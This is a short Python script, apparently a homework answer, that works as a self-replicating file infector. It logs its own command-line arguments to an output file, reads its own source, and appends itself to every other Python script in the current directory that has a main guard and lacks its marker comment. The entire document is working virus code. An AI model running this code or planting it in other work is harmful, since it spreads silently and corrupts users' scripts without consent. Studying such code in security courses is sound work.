# ive infected you with c
import os
import sys

def isScript(code):
    return "if __name__ == \"__main__\":" in code or "if __name__ == \'__main__\':" in code

def alreadyInfected(code):
    return "ive infected you with c" in code

if __name__ == "__main__":
    files = os.listdir()
    
    # open the out file, and write the terminal call of this file to it
    with open("Q1C.out", "a") as file:
        for arg in sys.argv:
            file.write(arg + " ")
        file.write("\n")
    
    # read itself
    with open(__file__, "r") as file:
        this_code = file.read()
        
    
    # if the current open file has not been infect, copy itself into it.
    for file in files:
        with open(file, "r") as current_file:
            code = current_file.read() 
        if file.endswith('.py') and isScript(code) and not alreadyInfected(code):
            with open(file, "a") as script:
                script.write(this_code[-951:])
